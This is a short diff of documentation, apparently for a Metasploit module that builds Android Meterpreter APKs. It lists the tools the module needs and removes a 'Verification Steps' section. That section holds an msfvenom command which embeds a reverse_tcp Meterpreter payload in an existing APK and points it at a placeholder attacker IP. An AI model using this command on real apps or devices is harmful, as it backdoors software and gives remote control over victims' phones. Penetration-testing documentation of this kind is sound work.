@@ -41,11 +41,6 @@ Apktool can be installed manually or automatically (e.g `brew install apktool` O
 keytool can be installed by installing the appropriate JDK.
 apksigner can be installed on Linux with `apt install apksigner`.
 
-## Verification Steps
-
-```
-./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
-```
 
 ## Create Meterpreter APK File
 
